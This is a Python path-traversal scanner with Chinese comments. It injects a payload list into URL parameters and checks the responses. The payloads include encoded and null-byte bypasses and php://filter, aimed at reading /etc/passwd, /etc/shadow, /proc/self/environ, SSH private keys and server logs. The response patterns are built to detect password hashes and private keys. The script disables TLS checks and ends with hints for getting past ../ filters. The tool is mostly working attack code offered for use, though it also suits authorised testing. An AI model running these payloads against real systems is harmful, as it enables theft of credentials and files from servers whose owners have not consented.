#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
路径遍历漏洞扫描器
检测Web应用中是否存在目录穿越/任意文件读取漏洞
"""

import requests
import argparse
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm

requests.packages.urllib3.disable_warnings()

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

TIMEOUT = 10

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..\\/..\\/..\\/etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/proc/cpuinfo",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/home/",
    "/root/",
    "/.ssh/id_rsa",
    "/.bash_history",
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.html",
    "../../../etc/passwd%2500",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
]

FILE_PATTERNS = {
    "passwd": [
        r'root:.*:0:0:',
        r'daemon:.*:1:1:',
        r'bin:.*:2:2:',
        r'nobody:.*:65534:',
        r'[a-zA-Z_][a-zA-Z0-9_-]*:x:\d+:\d+:',
    ],
    "shadow": [
        r'root:\$',
        r'[a-zA-Z_][a-zA-Z0-9_-]*:\$',
    ],
    "win_ini": [
        r'\[fonts\]',
        r'\[extensions\]',
        r'\[files\]',
        r'\[Mail\]',
    ],
    "hosts": [
        r'127\.0\.0\.1\s+localhost',
        r'::1\s+localhost',
    ],
    "proc": [
        r'Linux version',
        r'processor\s*:\s*\d+',
        r'model name',
        r'BogoMIPS',
    ],
    "boot_ini": [
        r'\[boot loader\]',
        r'\[operating systems\]',
        r'multi\(0\)disk\(0\)',
    ],
    "php_code": [
        r'<?php',
        r'PD9waHA=',
    ],
    "ssh_key": [
        r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
    ],
    "log": [
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*\[.*\].*"(GET|POST|PUT|DELETE)',
    ],
}

URL_PARAM_NAMES = [
    'file', 'path', 'dir', 'folder', 'document', 'doc',
    'page', 'template', 'include', 'load', 'read', 'view',
    'show', 'display', 'download', 'get', 'fetch', 'open',
    'src', 'source', 'name', 'location', 'prefix',
]


def extract_params(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return {k: v[0] for k, v in params.items()}


def inject_param(url, param_name, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param_name] = [payload]
    new_query = urlencode(params, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)


def identify_file_params(url):
    params = extract_params(url)
    file_params = []
    
    for param_name in params:
        if param_name.lower() in URL_PARAM_NAMES:
            file_params.append(param_name)
    
    for param_name in params:
        value = params[param_name]
        if '.' in value and '/' not in value:
            if param_name not in file_params:
                file_params.append(param_name)
    
    return file_params


def analyze_response(response_text, payload):
    for file_type, patterns in FILE_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return file_type, match.group(0)
    
    return None, None


def detect_path_traversal(url):
    print(f"[*] 目标URL: {url}")
    
    print(f"[*] 识别文件相关参数...")
    file_params = identify_file_params(url)
    
    if not file_params:
        print("[!] 未检测到疑似文件参数")
        all_params = extract_params(url)
        file_params = list(all_params.keys())
    
    if not file_params:
        print("[!] URL中没有参数")
        return None
    
    print(f"[+] 检测到 {len(file_params)} 个参数: {file_params}")
    
    print(f"[*] 获取正常响应基线...")
    normal_length = 0
    normal_text = ""
    try:
        response = requests.get(url, headers=DEFAULT_HEADERS, timeout=TIMEOUT, verify=False)
        normal_length = len(response.text)
        normal_text = response.text
    except:
        normal_length = 0
    
    print(f"[+] 正常响应长度: {normal_length} 字节")
    
    total_tests = len(file_params) * len(TRAVERSAL_PAYLOADS)
    print(f"[*] 总测试组合: {total_tests}")
    print(f"[*] 开始路径遍历漏洞扫描...\n")
    
    results = []
    
    with tqdm(total=total_tests, desc="扫描进度", unit="test") as pbar:
        for param_name in file_params:
            for payload in TRAVERSAL_PAYLOADS:
                test_url = inject_param(url, param_name, payload)
                
                try:
                    response = requests.get(
                        test_url,
                        headers=DEFAULT_HEADERS,
                        timeout=TIMEOUT,
                        verify=False
                    )
                    
                    response_text = response.text
                    response_length = len(response_text)
                    
                    file_type, evidence = analyze_response(response_text, payload)
                    
                    if file_type:
                        result = {
                            'url': test_url,
                            'param': param_name,
                            'payload': payload,
                            'type': '内容匹配',
                            'file_type': file_type,
                            'evidence': evidence,
                            'status_code': response.status_code,
                            'response_length': response_length,
                        }
                        results.append(result)
                        
                        tqdm.write(f"\n[+] 发现路径遍历漏洞!")
                        tqdm.write(f"    参数: {param_name}")
                        tqdm.write(f"    载荷: {payload}")
                        tqdm.write(f"    文件类型: {file_type}")
                        tqdm.write(f"    证据: {evidence[:100]}")
                    
                    elif normal_length > 0:
                        length_diff = abs(response_length - normal_length)
                        if length_diff > normal_length * 0.5 and response.status_code == 200:
                            if response_length > 100:
                                result = {
                                    'url': test_url,
                                    'param': param_name,
                                    'payload': payload,
                                    'type': '响应异常',
                                    'file_type': '未知',
                                    'evidence': f"响应长度异常: {response_length}字节 (正常: {normal_length}字节)",
                                    'status_code': response.status_code,
                                    'response_length': response_length,
                                }
                                results.append(result)
                                
                                tqdm.write(f"\n[+] 发现疑似路径遍历漏洞!")
                                tqdm.write(f"    参数: {param_name}")
                                tqdm.write(f"    载荷: {payload}")
                                tqdm.write(f"    响应长度: {response_length}字节")
                
                except Exception:
                    pass
                
                pbar.update(1)
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="路径遍历漏洞扫描器 - 检测目录穿越/任意文件读取漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python scanner.py -u "http://test.com/view.php?file=test.txt"
  python scanner.py -u "http://test.com/download.php?path=doc.pdf"
  python scanner.py -u "http://test.com/template.php?page=home" -o result.txt
        """
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="目标URL（包含参数）")
    parser.add_argument("-o", "--output",
                        help="结果输出文件路径")
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("路径遍历漏洞扫描器")
    print("=" * 50)
    
    results = detect_path_traversal(args.url)
    
    print(f"\n{'=' * 50}")
    if results:
        print(f"[+] 扫描完成！发现 {len(results)} 个路径遍历漏洞")
        print("=" * 50)
        
        file_types = {}
        for r in results:
            ft = r['file_type']
            file_types[ft] = file_types.get(ft, 0) + 1
        
        print(f"读取到的文件类型:")
        for ft, count in file_types.items():
            print(f"  {ft}: {count} 个")
        
        print(f"\n详细信息:")
        for i, result in enumerate(results, 1):
            print(f"\n{'─' * 40}")
            print(f"漏洞 {i}:")
            print(f"  URL: {result['url']}")
            print(f"  参数: {result['param']}")
            print(f"  载荷: {result['payload']}")
            print(f"  文件类型: {result['file_type']}")
            print(f"  证据: {result['evidence'][:200]}")
    else:
        print("[-] 未发现路径遍历漏洞")
        print("=" * 50)
    
    if args.output and results:
        with open(args.output, 'w', encoding='utf-8') as f:
            for result in results:
                f.write(f"参数: {result['param']}\n")
                f.write(f"载荷: {result['payload']}\n")
                f.write(f"文件类型: {result['file_type']}\n")
                f.write(f"证据: {result['evidence']}\n")
                f.write(f"URL: {result['url']}\n\n")
        print(f"\n[+] 结果已保存到: {args.output}")
    
    if not results:
        print("\n[*] 提示：")
        print("    1. 路径遍历可能存在于POST参数、Cookie中")
        print("    2. 目标可能过滤了 ../ ，尝试URL编码、双写等绕过")
        print("    3. 部分漏洞需要结合绝对路径或特定后缀")


if __name__ == "__main__":
    main()